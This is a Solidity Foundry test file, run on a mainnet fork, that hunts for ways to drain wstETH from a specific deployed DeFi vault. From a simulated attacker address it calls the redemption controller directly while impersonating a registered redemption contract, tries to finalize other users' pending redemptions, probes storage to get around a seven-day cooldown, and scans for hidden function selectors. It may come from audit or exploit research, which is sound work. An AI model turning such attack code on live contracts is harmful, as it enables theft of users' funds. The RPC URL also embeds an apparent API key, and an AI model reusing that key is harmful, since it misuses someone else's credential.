// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
    function totalSupply() external view returns (uint256);
}

contract ImmediateDrainInvestigation is Test {
    address constant REDEMPTION_0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant REDEMPTION_1 = 0x829525417Cd78CBa0f99A8736426fC299506C0d6;
    address constant REDEMPTION_CONTROLLER = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant TASSET = 0xD11c452fc99cF405034ee446803b6F6c1F6d5ED8;
    address constant TIMELOCK = 0x2225DAbFfC7F862c99477381E971E8B1FDaB467e;
    address constant IAU = 0x1B6238E95bBCABEE58997c99BaDD4154ad68BA92;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_ValidateAllMetrics() public view {
        console.log("=== COMPLETE METRICS VALIDATION ===\n");

        // Vault metrics
        uint256 vaultWstETH = IERC20(wstETH).balanceOf(VAULT);
        console.log("VAULT wstETH balance:", vaultWstETH / 1e18, "wstETH");
        console.log("VAULT wstETH (wei):", vaultWstETH);
        console.log("USD value (~$2300/ETH): $", (vaultWstETH / 1e18) * 2300);

        // TASSET metrics
        uint256 tassetSupply = IERC20(TASSET).totalSupply();
        console.log("\nTASSET total supply:", tassetSupply / 1e18);

        // RC registration verification
        console.log("\n=== RC REGISTRATION VERIFICATION ===");
        bytes32 r0Key = keccak256(abi.encode(REDEMPTION_0, uint256(4)));
        bytes32 r0Val = vm.load(REDEMPTION_CONTROLLER, r0Key);
        console.log("R0 registration value:", uint256(r0Val));

        bytes32 r1Key = keccak256(abi.encode(REDEMPTION_1, uint256(4)));
        bytes32 r1Val = vm.load(REDEMPTION_CONTROLLER, r1Key);
        console.log("R1 registration value:", uint256(r1Val));

        // Check RC owner
        bytes32 rcOwnerSlot = vm.load(REDEMPTION_CONTROLLER, bytes32(uint256(0)));
        console.log("\nRC owner:", address(uint160(uint256(rcOwnerSlot))));

        // Check R0 owner
        bytes32 r0OwnerSlot = vm.load(REDEMPTION_0, bytes32(uint256(0)));
        console.log("R0 owner:", address(uint160(uint256(r0OwnerSlot))));

        // Check R1 owner
        bytes32 r1OwnerSlot = vm.load(REDEMPTION_1, bytes32(uint256(0)));
        console.log("R1 owner:", address(uint160(uint256(r1OwnerSlot))));
    }

    function test_FindExistingPendingRedemptions() public view {
        console.log("=== SEARCHING FOR EXISTING PENDING REDEMPTIONS ===\n");

        // Check if there are any pending redemptions we could hijack
        // by calling finalizeRedeem on behalf of someone else

        // First, let's check R0's redemption mapping structure
        // Slot 5 appears to be flag, Slot 6 is amount

        // Try to find users with pending redemptions by checking known addresses
        address[] memory potentialUsers = new address[](10);
        potentialUsers[0] = 0x0000000000000000000000000000000000000001;
        potentialUsers[1] = 0xd8dA6BF26964aF9D7eEd9e03E53415D37aA96045; // vitalik
        potentialUsers[2] = TIMELOCK;
        potentialUsers[3] = 0xB38f2aCb7B562475908c0C6E80a045Deb4023f70; // Treasury Safe
        potentialUsers[4] = VAULT;
        potentialUsers[5] = REDEMPTION_0;
        potentialUsers[6] = REDEMPTION_1;
        potentialUsers[7] = REDEMPTION_CONTROLLER;
        potentialUsers[8] = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0; // wstETH
        potentialUsers[9] = 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84; // stETH

        console.log("Checking getRedeemLength for known addresses:");

        for (uint i = 0; i < potentialUsers.length; i++) {
            (bool s, bytes memory d) = REDEMPTION_0.staticcall(
                abi.encodeWithSignature("getRedeemLength(address)", potentialUsers[i])
            );
            if (s && d.length >= 32) {
                uint256 len = abi.decode(d, (uint256));
                if (len > 0) {
                    console.log("User", i, "has redemptions:", len);
                    console.log("  Address:", potentialUsers[i]);
                }
            }
        }
    }

    function test_CheckCooldownParameters() public view {
        console.log("=== ANALYZING COOLDOWN PARAMETERS ===\n");

        // Find the cooldown delay in R0 storage
        console.log("R0 storage slots (looking for delay):");
        for (uint i = 0; i < 20; i++) {
            bytes32 slot = vm.load(REDEMPTION_0, bytes32(i));
            if (slot != bytes32(0)) {
                uint256 val = uint256(slot);
                console.log("Slot", i, ":");
                if (val < 1000000) {
                    console.log("  Value:", val);
                    if (val == 604800) {
                        console.log("  *** THIS IS 7 DAYS IN SECONDS ***");
                    }
                } else if (val < type(uint160).max) {
                    console.log("  As address:", address(uint160(val)));
                } else {
                    console.logBytes32(slot);
                }
            }
        }

        // Check if delay can be set
        console.log("\nLooking for setDelay or similar functions:");
        bytes4[] memory delaySels = new bytes4[](5);
        delaySels[0] = bytes4(keccak256("setDelay(uint256)"));
        delaySels[1] = bytes4(keccak256("setCooldown(uint256)"));
        delaySels[2] = bytes4(keccak256("setRedemptionDelay(uint256)"));
        delaySels[3] = bytes4(keccak256("delay()"));
        delaySels[4] = bytes4(keccak256("cooldown()"));

        for (uint i = 0; i < delaySels.length; i++) {
            (bool s, bytes memory d) = REDEMPTION_0.staticcall(
                abi.encodeWithSelector(delaySels[i])
            );
            if (s && d.length >= 32) {
                console.log("Found working selector:");
                console.logBytes4(delaySels[i]);
                console.log("  Value:", abi.decode(d, (uint256)));
            }
        }
    }

    function test_DirectRCRedeemPaths() public {
        console.log("=== INVESTIGATING DIRECT RC.REDEEM PATHS ===\n");

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault before:", vaultBefore / 1e18);

        vm.startPrank(attacker);

        // Try direct call to RC.redeem
        console.log("\n1. Direct call to RC.redeem as attacker:");
        (bool s1, bytes memory d1) = REDEMPTION_CONTROLLER.call(
            abi.encodeWithSignature("redeem(uint256,address)", 1000e18, attacker)
        );
        console.log("   Success:", s1);
        if (!s1 && d1.length >= 4) {
            console.log("   Error:");
            console.logBytes4(bytes4(d1));
        }

        // Try as R0
        vm.stopPrank();
        vm.startPrank(REDEMPTION_0);
        console.log("\n2. Direct call to RC.redeem as R0:");
        (bool s2,) = REDEMPTION_CONTROLLER.call(
            abi.encodeWithSignature("redeem(uint256,address)", 1000e18, attacker)
        );
        console.log("   Success:", s2);

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        uint256 attackerBal = IERC20(wstETH).balanceOf(attacker);
        console.log("\nVault after:", vaultAfter / 1e18);
        console.log("Attacker received:", attackerBal / 1e18);

        if (attackerBal > 0) {
            console.log("\n*** DIRECT RC.REDEEM AS R0 WORKS! ***");
        }

        vm.stopPrank();
    }

    function test_FindAllRCRegistrations() public view {
        console.log("=== FINDING ALL RC REGISTRATIONS ===\n");

        // RC uses mapping at slot 4 for registered redemption contracts
        // Value 1 = R0, Value 2 = R1
        // Are there others?

        console.log("Checking known contracts for registration:");

        address[] memory contracts = new address[](15);
        contracts[0] = REDEMPTION_0;
        contracts[1] = REDEMPTION_1;
        contracts[2] = VAULT;
        contracts[3] = TIMELOCK;
        contracts[4] = IAU;
        contracts[5] = 0xB38f2aCb7B562475908c0C6E80a045Deb4023f70; // Treasury Safe
        contracts[6] = 0x434B68B11bBE8FD3074089397cA3d275801d6354; // R1 impl
        contracts[7] = wstETH;
        contracts[8] = TASSET;
        contracts[9] = 0xEf69713F639130B6F0D4A12a11E2169a4d1bD52a; // Mystery
        contracts[10] = 0x0000000000000000000000000000000000000000;
        contracts[11] = 0x0000000000000000000000000000000000000001;
        contracts[12] = 0x0000000000000000000000000000000000000002;
        contracts[13] = 0x0000000000000000000000000000000000000003;
        contracts[14] = address(this);

        for (uint i = 0; i < contracts.length; i++) {
            bytes32 key = keccak256(abi.encode(contracts[i], uint256(4)));
            bytes32 val = vm.load(REDEMPTION_CONTROLLER, key);
            if (val != bytes32(0)) {
                console.log("REGISTERED:", contracts[i]);
                console.log("  Value:", uint256(val));
            }
        }

        // Scan RC storage for all non-zero entries
        console.log("\nRC storage scan:");
        for (uint i = 0; i < 20; i++) {
            bytes32 slot = vm.load(REDEMPTION_CONTROLLER, bytes32(i));
            if (slot != bytes32(0)) {
                console.log("Slot", i, ":");
                console.logBytes32(slot);
            }
        }
    }

    function test_BypassCooldownViaStorageManipulation() public {
        console.log("=== TESTING COOLDOWN BYPASS VIA STORAGE ===\n");

        // What if we could manipulate the redemption timestamp?
        // First, let's understand the redemption struct storage

        deal(TASSET, attacker, 10000e18);

        vm.startPrank(attacker);
        IERC20(TASSET).approve(REDEMPTION_0, type(uint256).max);

        // Create a redemption
        (bool s1,) = REDEMPTION_0.call(
            abi.encodeWithSignature("redeem(uint96)", uint96(1000e18))
        );
        console.log("Created redemption:", s1);

        vm.stopPrank();

        // Now find where the redemption data is stored
        console.log("\nSearching for redemption storage after creation:");

        // Check mapping slots with attacker address
        for (uint baseSlot = 0; baseSlot < 15; baseSlot++) {
            bytes32 key = keccak256(abi.encode(attacker, baseSlot));
            bytes32 val = vm.load(REDEMPTION_0, key);
            if (val != bytes32(0)) {
                console.log("Found at mapping slot", baseSlot, ":");
                console.logBytes32(val);

                // Check next slots for struct data
                for (uint j = 0; j < 5; j++) {
                    bytes32 structKey = bytes32(uint256(key) + j);
                    bytes32 structVal = vm.load(REDEMPTION_0, structKey);
                    if (structVal != bytes32(0)) {
                        console.log("  Struct offset", j, ":");
                        console.logBytes32(structVal);
                        console.log("    As uint:", uint256(structVal));
                    }
                }
            }
        }

        // Try array-style storage (if redemptions are in array per user)
        console.log("\nChecking array-style storage:");
        bytes32 arrayBase = keccak256(abi.encode(attacker, uint256(5)));
        bytes32 arrayLen = vm.load(REDEMPTION_0, keccak256(abi.encode(attacker, uint256(5))));
        console.log("Potential array length:", uint256(arrayLen));

        // Check the array elements
        bytes32 elemBase = keccak256(abi.encodePacked(arrayBase));
        for (uint i = 0; i < 5; i++) {
            bytes32 elem = vm.load(REDEMPTION_0, bytes32(uint256(elemBase) + i));
            if (elem != bytes32(0)) {
                console.log("Array elem", i, ":");
                console.logBytes32(elem);
            }
        }
    }

    function test_ExploitViaExistingRedemption() public {
        console.log("=== TESTING EXPLOITATION OF EXISTING REDEMPTIONS ===\n");

        // Search for ANY address that has pending redemptions
        // by scanning storage or trying known TASSET holders

        // Get TASSET holder events or check known DeFi addresses
        address[] memory holders = new address[](5);
        holders[0] = 0xd8dA6BF26964aF9D7eEd9e03E53415D37aA96045;
        holders[1] = 0x28C6c06298d514Db089934071355E5743bf21d60; // Binance
        holders[2] = 0xDef1C0ded9bec7F1a1670819833240f027b25EfF; // 0x
        holders[3] = 0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45; // Uniswap
        holders[4] = 0x1111111254EEB25477B68fb85Ed929f73A960582; // 1inch

        console.log("Checking known addresses for pending redemptions:");

        for (uint i = 0; i < holders.length; i++) {
            (bool s, bytes memory d) = REDEMPTION_0.staticcall(
                abi.encodeWithSignature("getRedeemLength(address)", holders[i])
            );
            if (s && d.length >= 32) {
                uint256 len = abi.decode(d, (uint256));
                if (len > 0) {
                    console.log("FOUND:", holders[i]);
                    console.log("  Pending redemptions:", len);

                    // Try to finalize their redemption!
                    console.log("  Attempting to finalize...");
                    vm.startPrank(attacker);
                    (bool fs,) = REDEMPTION_0.call(
                        abi.encodeWithSignature("finalizeRedeem(uint256)", 0)
                    );
                    console.log("  Finalize success:", fs);
                    vm.stopPrank();
                }
            }
        }
    }

    function test_IAUContractExploit() public {
        console.log("=== INVESTIGATING IAU CONTRACT ===\n");

        // IAU at 0x1B6238E95bBCABEE58997c99BaDD4154ad68BA92
        // This might have different capabilities

        console.log("IAU address:", IAU);
        console.log("IAU code size:", IAU.code.length);

        // Check IAU storage
        console.log("\nIAU storage:");
        for (uint i = 0; i < 10; i++) {
            bytes32 slot = vm.load(IAU, bytes32(i));
            if (slot != bytes32(0)) {
                console.log("Slot", i, ":");
                console.logBytes32(slot);
                console.log("  As address:", address(uint160(uint256(slot))));
            }
        }

        // Is IAU registered in RC?
        bytes32 iauKey = keccak256(abi.encode(IAU, uint256(4)));
        bytes32 iauVal = vm.load(REDEMPTION_CONTROLLER, iauKey);
        console.log("\nIAU registration in RC:", uint256(iauVal));

        // Try calling IAU functions
        console.log("\nTrying IAU functions:");

        bytes4[] memory iauSels = new bytes4[](10);
        iauSels[0] = bytes4(keccak256("redeem(uint256)"));
        iauSels[1] = bytes4(keccak256("redeem(uint256,address)"));
        iauSels[2] = bytes4(keccak256("withdraw(uint256)"));
        iauSels[3] = bytes4(keccak256("claim()"));
        iauSels[4] = bytes4(keccak256("owner()"));
        iauSels[5] = bytes4(keccak256("vault()"));
        iauSels[6] = bytes4(keccak256("asset()"));
        iauSels[7] = bytes4(keccak256("underlying()"));
        iauSels[8] = bytes4(keccak256("execute(address,bytes)"));
        iauSels[9] = bytes4(keccak256("totalAssets()"));

        for (uint i = 0; i < iauSels.length; i++) {
            (bool s, bytes memory d) = IAU.staticcall(
                abi.encodeWithSelector(iauSels[i])
            );
            if (s && d.length >= 32) {
                console.log("Success:");
                console.logBytes4(iauSels[i]);
                if (d.length == 32) {
                    uint256 val = abi.decode(d, (uint256));
                    if (val < type(uint160).max && val > 0x1000) {
                        console.log("  Address:", address(uint160(val)));
                    } else {
                        console.log("  Value:", val);
                    }
                }
            }
        }
    }

    function test_R1DifferentBehavior() public {
        console.log("=== TESTING R1 FOR DIFFERENT BEHAVIOR ===\n");

        // R1 might have different logic - let's test it thoroughly

        deal(TASSET, attacker, 10000e18);

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault before:", vaultBefore / 1e18);

        vm.startPrank(attacker);
        IERC20(TASSET).approve(REDEMPTION_1, type(uint256).max);

        console.log("\nTrying R1 redeem:");
        (bool s1, bytes memory d1) = REDEMPTION_1.call(
            abi.encodeWithSignature("redeem(uint96)", uint96(1000e18))
        );
        console.log("redeem(uint96):", s1);
        if (!s1 && d1.length >= 4) {
            console.logBytes4(bytes4(d1));
        }

        // Check what functions R1 has
        console.log("\nR1 available functions:");
        bytes4[] memory r1Sels = new bytes4[](15);
        r1Sels[0] = bytes4(keccak256("redeem(uint96)"));
        r1Sels[1] = bytes4(keccak256("redeem(uint256)"));
        r1Sels[2] = bytes4(keccak256("instantRedeem(uint256)"));
        r1Sels[3] = bytes4(keccak256("instantRedeem(uint96)"));
        r1Sels[4] = bytes4(keccak256("quickRedeem(uint256)"));
        r1Sels[5] = bytes4(keccak256("directRedeem(uint256,address)"));
        r1Sels[6] = bytes4(keccak256("finalizeRedeem(uint256)"));
        r1Sels[7] = bytes4(keccak256("claimRewards()"));
        r1Sels[8] = bytes4(keccak256("claim()"));
        r1Sels[9] = bytes4(keccak256("harvest()"));
        r1Sels[10] = bytes4(keccak256("getRedeemLength(address)"));
        r1Sels[11] = bytes4(keccak256("delay()"));
        r1Sels[12] = bytes4(keccak256("cooldown()"));
        r1Sels[13] = bytes4(keccak256("emergencyWithdraw()"));
        r1Sels[14] = bytes4(keccak256("rescueTokens(address,uint256)"));

        for (uint i = 0; i < r1Sels.length; i++) {
            (bool s,) = REDEMPTION_1.staticcall{gas: 100000}(
                abi.encodeWithSelector(r1Sels[i], attacker)
            );
            if (s) {
                console.log("View success:");
                console.logBytes4(r1Sels[i]);
            }
        }

        vm.stopPrank();
    }
}
